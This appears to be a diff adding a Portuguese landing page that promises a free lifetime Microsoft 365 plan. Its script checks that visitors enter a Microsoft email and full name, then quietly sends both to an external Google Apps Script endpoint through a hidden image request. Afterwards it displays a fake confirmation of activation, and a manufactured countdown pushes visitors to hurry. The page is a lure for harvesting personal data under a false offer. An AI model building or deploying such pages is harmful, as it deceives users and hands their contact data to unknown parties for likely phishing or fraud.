+          <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/>
+        </svg>
+        <div class="pf-card-label">OneNote</div>
+        <div class="pf-card-val">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          Incluso
+        </div>
+      </div>
+
+      <div class="pf-card">
+        <svg class="pf-card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
+        </svg>
+        <div class="pf-card-label">Usuários</div>
+        <div class="pf-card-val">1 usuário</div>
+      </div>
+    </div>
+
+    <!-- DESKTOP: tabela -->
+    <div class="ctable-wrap">
+      <table>
+        <thead>
+          <tr><th>Recurso</th><th>Free Vitalício</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Preço</td><td><span class="pf">R$ 0 para sempre</span></td></tr>
+          <tr><td>Word, Excel, PowerPoint Online</td><td><span class="chk">✓</span></td></tr>
+          <tr><td>Apps para desktop</td><td><span class="chk">✓</span></td></tr>
+          <tr><td>OneDrive</td><td><span class="stag2">1 TB</span></td></tr>
+          <tr><td>Teams</td><td><span class="chk">✓</span></td></tr>
+          <tr><td>OneNote</td><td><span class="chk">✓</span></td></tr>
+          <tr><td>Usuários</td><td>1</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- HOW IT WORKS -->
+<section class="bg-w" id="como-funciona">
+  <div class="wrap">
+    <p class="eyebrow2">Passo a passo</p>
+    <h2 class="stit">Do cadastro ao acesso em 24h</h2>
+    <p class="ssub2">Processo simples, rápido e 100% online.</p>
+    <div class="how-grid">
+      <div class="hcard"><div class="hnum">1</div><h4>Preencha o formulário</h4><p>Informe seu e-mail Microsoft e nome completo no formulário no topo da página.</p></div>
+      <div class="hcard"><div class="hnum">2</div><h4>Confirme os dados</h4><p>Revise suas informações e clique em "Ativar plano" para concluir o cadastro.</p></div>
+      <div class="hcard"><div class="hnum">3</div><h4>Receba a confirmação</h4><p>Um e-mail de confirmação é enviado imediatamente ao endereço cadastrado.</p></div>
+      <div class="hcard"><div class="hnum">4</div><h4>Acesso liberado em 24h</h4><p>Você receberá um segundo e-mail confirmando que seu acesso foi ativado.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer class="site-footer">
+  <div class="wrap">
+    <div class="ftr">
+      <div class="flinks">
+        <a href="#">Privacidade</a>
+        <a href="#">Termos de uso</a>
+        <a href="#">Acessibilidade</a>
+        <a href="#">Contato</a>
+      </div>
+      <p class="fnote">Esta página é informativa e não possui vínculo oficial com a Microsoft Corporation. Microsoft®, Office® e produtos relacionados são marcas registradas da Microsoft Corporation.</p>
+    </div>
+  </div>
+</footer>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* ── EmailJS ─────────────────────────────────────────────────────
+   Para ativar:
+   1. Crie conta gratuita em https://emailjs.com
+   2. Conecte um e-mail (Gmail, Outlook etc.)
+   3. Crie um template com {{to_name}} e {{to_email}}
+   4. Preencha abaixo e mude EMAIL_ON para true
+────────────────────────────────────────────────────────────────── */
+const EMAIL_ON   = false;
+const EJ_KEY     = 'SUA_PUBLIC_KEY';
+const EJ_SERVICE = 'SUA_SERVICE_ID';
+const EJ_TPL     = 'SEU_TEMPLATE_ID';
+if (EMAIL_ON) emailjs.init(EJ_KEY);
+
+const SHEETS_URL = 'https://script.google.com/macros/s/AKfycbw6rWLp_EQsuy2dTOhq0K_26Ruv0PGcItCbF_FjmJ6U-PSZoVvNGUaHzybbPHCiSGSm/exec';
+
+const MS_DOMAINS = ['hotmail.com','outlook.com','live.com','msn.com','hotmail.com.br','outlook.com.br','live.com.br','hotmail.es','outlook.es','live.com.mx','live.com.ar'];
+
+function isMsEmail(v) {
+  const p = v.trim().toLowerCase().split('@');
+  return p.length === 2 && p[0].length > 0 && MS_DOMAINS.includes(p[1]);
+}
+
+function setDomain(d) {
+  const el = document.getElementById('f-email');
+  const at = el.value.indexOf('@');
+  el.value = (at >= 0 ? el.value.slice(0, at) : el.value) + d;
+  el.focus();
+}
+
+function showToast(msg) {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), 3500);
+}
+
+function goPanel(n) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.getElementById('p' + n).classList.add('active');
+  document.querySelectorAll('.stab').forEach(t => {
+    const s = +t.dataset.s;
+    t.classList.remove('active','done');
+    if (s === n) t.classList.add('active');
+    else if (s < n) t.classList.add('done');
+  });
+  if (window.innerWidth < 920) {
+    document.querySelector('.fcard').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }
+}
+
+function step1() {
+  const el = document.getElementById('f-email');
+  const er = document.getElementById('err-email');
+  if (!isMsEmail(el.value)) {
+    el.classList.add('err'); er.classList.add('show'); el.focus(); return;
+  }
+  el.classList.remove('err'); er.classList.remove('show');
+  goPanel(2);
+  setTimeout(() => document.getElementById('f-nome').focus(), 350);
+}
+
+function step2() {
+  const el = document.getElementById('f-nome');
+  const er = document.getElementById('err-nome');
+  if (el.value.trim().length < 8) {
+    el.classList.add('err'); er.classList.add('show'); el.focus(); return;
+  }
+  el.classList.remove('err'); er.classList.remove('show');
+  document.getElementById('c-email').textContent = document.getElementById('f-email').value.trim();
+  goPanel(3);
+}
+
+async function finalizar() {
+  const btn   = document.getElementById('btn-final');
+  const email = document.getElementById('f-email').value.trim();
+  const nome  = document.getElementById('f-nome').value.trim();
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span>Enviando…';
+
+  // Envia via GET com parâmetros na URL — contorna CORS em todos os dispositivos
+  try {
+    const params = new URLSearchParams({ email, nome });
+    const img = new Image();
+    img.src = SHEETS_URL + '?' + params.toString();
+    await new Promise(r => setTimeout(r, 1800));
+  } catch(e) { console.warn('Sheets error:', e); }
+
+  document.getElementById('s-email').textContent = email;
+  goPanel(4);
+  btn.disabled = false;
+  btn.innerHTML = 'Ativar plano';
+  showToast('✅ Cadastro concluído! Verifique seu e-mail.');
+}
+
+document.getElementById('f-email').addEventListener('keydown', e => { if (e.key==='Enter') step1(); });
+document.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('f-nome').addEventListener('keydown', e => { if (e.key==='Enter') step2(); });
+});
+
+// Countdown regressivo
+(function(){
+  const KEY = 'ms365_promo_end';
+  let end = sessionStorage.getItem(KEY);
+  if (!end) {
+    end = Date.now() + 3 * 24 * 60 * 60 * 1000;
+    sessionStorage.setItem(KEY, end);
+  }
+  end = parseInt(end);
+  function pad(n){ return String(n).padStart(2,'0'); }
+  function tick(){
+    const diff = Math.max(0, end - Date.now());
+    const d = Math.floor(diff / 86400000);
+    const h = Math.floor((diff % 86400000) / 3600000);
+    const m = Math.floor((diff % 3600000) / 60000);
+    const s = Math.floor((diff % 60000) / 1000);
+    document.getElementById('cd-d').textContent = pad(d);
+    document.getElementById('cd-h').textContent = pad(h);
+    document.getElementById('cd-m').textContent = pad(m);
+    document.getElementById('cd-s').textContent = pad(s);
+  }
+  tick();
+  setInterval(tick, 1000);
+})();
+</script>
+</body>
+</html>
